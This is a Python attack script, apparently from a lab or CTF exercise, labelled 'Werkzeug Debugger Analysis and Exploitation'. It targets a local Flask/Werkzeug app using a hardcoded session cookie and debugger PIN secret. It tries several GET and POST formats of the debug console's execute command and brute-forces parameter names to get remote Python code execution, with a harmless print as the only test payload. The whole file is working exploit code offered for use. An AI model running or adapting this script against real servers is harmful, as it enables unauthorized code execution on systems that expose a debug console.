import requests
import re
import urllib.parse
import json

BASE_URL = "http://127.0.0.1:5003"
SESSION_COOKIE = ".eJwlTstqwzAQ_BWx51Cst-Sv6L2EsJZmY4PbFMs5hfx7F3oa5sm86CY7jxWD5q8XmVOBvjEG30EX-tzBA2Z_3M32Y86H4dbUNOe6DfOrmQ-6vq8XHTkwVprP4wllW6eZandSI3oCCy8MnqKPUoMU26dgpQPcXJhqVsMFgeXInUOISBXF55jES2jagbSaknNoPi8uoTW_5OoXUb0Um3KIMulyh5cktfuYuej923Pg-H9j6f0Hj05H0g.aVsUEw.pzEXTKPJRkglOFBxL9YRXm0BK1c"
SECRET = "YKhX0CLt5PHAxuDtcFOy"

headers = {
    "User-Agent": "Mozilla/5.0 (Security Research)",
    "Cookie": f"session={SESSION_COOKIE}"
}

def test_debugger_resources():
    """Test accessing debugger resources to understand the API"""
    print("Testing debugger resources...")
    
    resources = [
        f"{BASE_URL}/console?__debugger__=yes&cmd=resource&f=debugger.js",
        f"{BASE_URL}/console?__debugger__=yes&cmd=resource&f=style.css",
        f"{BASE_URL}/console?__debugger__=yes&cmd=resource&f=console.png"
    ]
    
    for resource in resources:
        try:
            resp = requests.get(resource, headers=headers)
            print(f"{resource.split('&f=')[1]}: Status {resp.status_code}, Length {len(resp.content)}")
            if resource.endswith('debugger.js') and resp.status_code == 200:
                # Look for the execute function
                if 'execute' in resp.text:
                    print("[+] Found execute function in debugger.js")
        except Exception as e:
            print(f"Error accessing {resource}: {e}")

def try_execute_endpoint():
    """Try different execute endpoint formats"""
    print("\nTrying execute endpoints...")
    
    test_code = "print('test execution')"
    
    # Different endpoint formats
    endpoints = [
        f"{BASE_URL}/console?__debugger__=yes&cmd=execute&frm=0&s={SECRET}&code={urllib.parse.quote(test_code)}",
        f"{BASE_URL}/console?__debugger__=yes&cmd=execute&s={SECRET}&code={urllib.parse.quote(test_code)}",
        f"{BASE_URL}/console?s={SECRET}&cmd=execute&code={urllib.parse.quote(test_code)}",
        f"{BASE_URL}/?__debugger__=yes&cmd=execute&frm=0&s={SECRET}&code={urllib.parse.quote(test_code)}"
    ]
    
    for endpoint in endpoints:
        try:
            print(f"Testing: {endpoint[:100]}...")
            resp = requests.get(endpoint, headers=headers, timeout=10)
            print(f"  Status: {resp.status_code}")
            if resp.status_code == 200:
                print(f"  Response: {resp.text[:200]}")
                return endpoint
        except Exception as e:
            print(f"  Error: {e}")
    
    return None

def try_console_post():
    """Try POST method to console"""
    print("\nTrying POST to console...")
    
    # Try different POST formats
    post_data_list = [
        {"code": "print('test')", "s": SECRET, "frm": "0"},
        {"cmd": "execute", "s": SECRET, "frm": "0", "code": "print('test')"},
        {"__debugger__": "yes", "cmd": "execute", "s": SECRET, "code": "print('test')"}
    ]
    
    for post_data in post_data_list:
        try:
            print(f"Testing POST with: {post_data}")
            resp = requests.post(f"{BASE_URL}/console", headers=headers, data=post_data, timeout=10)
            print(f"  Status: {resp.status_code}")
            if resp.status_code == 200:
                print(f"  Response: {resp.text[:200]}")
        except Exception as e:
            print(f"  Error: {e}")

def analyze_console_response():
    """Analyze the console HTML to understand how to interact with it"""
    print("\nAnalyzing console HTML...")
    
    try:
        resp = requests.get(f"{BASE_URL}/console", headers=headers)
        if resp.status_code == 200:
            # Look for forms
            form_match = re.search(r'<form[^>]*>(.*?)</form>', resp.text, re.DOTALL | re.IGNORECASE)
            if form_match:
                print("[+] Found form in console page")
                form_html = form_match.group(1)
                print(f"Form HTML: {form_html[:300]}")
                
                # Extract form details
                action = re.search(r'action=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
                method = re.search(r'method=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
                inputs = re.findall(r'<input[^>]*name=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
                
                print(f"Action: {action.group(1) if action else 'none'}")
                print(f"Method: {method.group(1) if method else 'GET'}")
                print(f"Inputs: {inputs}")
            
            # Look for JavaScript that handles execution
            if 'ajax' in resp.text.lower() or 'fetch' in resp.text.lower() or 'xmlhttp' in resp.text.lower():
                print("[+] Found AJAX/fetch calls in console page")
                
                # Extract JavaScript
                js_matches = re.findall(r'<script[^>]*>(.*?)</script>', resp.text, re.DOTALL | re.IGNORECASE)
                for i, js in enumerate(js_matches):
                    if 'execute' in js.lower() or 'console' in js.lower() or 'code' in js.lower():
                        print(f"\n[+] Found relevant JavaScript block {i}:")
                        print(js[:500])
    except Exception as e:
        print(f"Error analyzing console: {e}")

def brute_force_param_names():
    """Try different parameter names for code execution"""
    print("\nBrute forcing parameter names...")
    
    test_code = "print('success')"
    param_names = ["code", "query", "cmd", "command", "exec", "execute", "eval", "python", "script"]
    
    for param_name in param_names:
        try:
            # Try GET with parameter
            url = f"{BASE_URL}/console?__debugger__=yes&cmd=execute&s={SECRET}&{param_name}={urllib.parse.quote(test_code)}"
            resp = requests.get(url, headers=headers)
            if resp.status_code == 200 and 'success' in resp.text:
                print(f"[+] Success with parameter '{param_name}'")
                return param_name
            
            # Try POST with parameter
            resp = requests.post(
                f"{BASE_URL}/console?__debugger__=yes&cmd=execute&s={SECRET}",
                headers=headers,
                data={param_name: test_code},
                timeout=10
            )
            if resp.status_code == 200 and 'success' in resp.text:
                print(f"[+] Success with POST parameter '{param_name}'")
                return param_name
                
        except Exception as e:
            print(f"Error with param {param_name}: {e}")
    
    return None

def main():
    print("Werkzeug Debugger Analysis and Exploitation")
    print("=" * 60)
    
    # Test resources
    test_debugger_resources()
    
    # Try different execute endpoints
    working_endpoint = try_execute_endpoint()
    
    # Try POST methods
    try_console_post()
    
    # Analyze the console page
    analyze_console_response()
    
    # Try to find correct parameter names
    param_name = brute_force_param_names()
    
    print(f"\n{'='*60}")
    print("SUMMARY")
    print(f"{'='*60}")
    
    if working_endpoint:
        print(f"[+] Found working endpoint: {working_endpoint}")
    if param_name:
        print(f"[+] Found working parameter: {param_name}")
    if not working_endpoint and not param_name:
        print("[-] Could not find working code execution method")
        print("[?] The console might require JavaScript interaction")
        print(f"[?] Try accessing manually with secret: {SECRET}")

if __name__ == "__main__":
    main()
